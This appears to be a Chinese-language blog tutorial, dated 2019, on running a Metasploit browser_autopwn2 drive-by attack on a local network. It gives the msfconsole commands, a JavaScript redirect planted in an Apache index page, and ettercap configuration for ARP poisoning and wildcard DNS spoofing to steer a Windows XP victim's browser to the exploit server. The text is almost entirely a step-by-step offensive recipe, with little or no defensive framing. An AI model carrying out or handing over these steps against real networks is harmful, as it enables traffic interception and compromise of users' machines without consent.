MSF浏览器自动攻击

2019-04-08

一.环境准备

Kali、win xp，使用ettertcap

MSF的exp：browser autopwn2

在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点（恶意URL）

二.在Metasploit上加载browser autopwn2

1.启动metasploit

/etc/init.d/postgresql start

msfconsole

2.启动browser autopwn2

search browser_autopwn2

use auxiliary/server/browser_autopwn2

run

三.在apache2写跳转代码

leafpad /var/www/html/index.html

写入

<script language="javascript" type="text/javascript"> // 以下方式定时跳转 setTimeout("javascript:location.href='URL'", 5000); </script>

其中，URL为Metaspliot生成的Browser Autopwn URL

四.使用ettercap进行DNS欺骗

1.修改etter.dns文件

vim /etc/ettercap/etter.dns

添加以下字段

www.*.com A 主机IP

www.*.com PTR 主机IP

2.进入ettercap图形化界面

ettercap -G

1.sniff-unified sniffing 找网卡

2.scan for hosts 扫描hosts

3.hosts lists 列出hosts

4.网关ip添加到target1 欺骗IP（这里是win xp的IP）添加到target2

5.ARP欺骗–Mitm–Sniff remote connections

6.Plugins–Manage the plugins–双击dns_spoof

7.start-start sniffing
